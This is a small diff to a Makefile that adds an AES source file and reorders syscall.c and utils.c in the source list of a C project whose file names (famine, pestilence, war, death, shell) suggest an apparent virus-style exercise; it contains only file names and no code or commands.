@@ -5,15 +5,16 @@ override src_dir := src
 override srcs := 	main.c \
 					crypt/crypt.c \
 					crypt/xor_crypt.c \
+					crypt/aes.c \
+				 	syscall.c \
+					utils.c \
 					famine.c \
 				 	data.c \
 				 	map.c \
 				 	bss.c \
-				 	utils.c \
 				 	pestilence.c \
 				 	war.c \
 				 	daemon.c \
-				 	syscall.c \
 				 	death.c \
 				 	shell.c \
 				 	error.c \
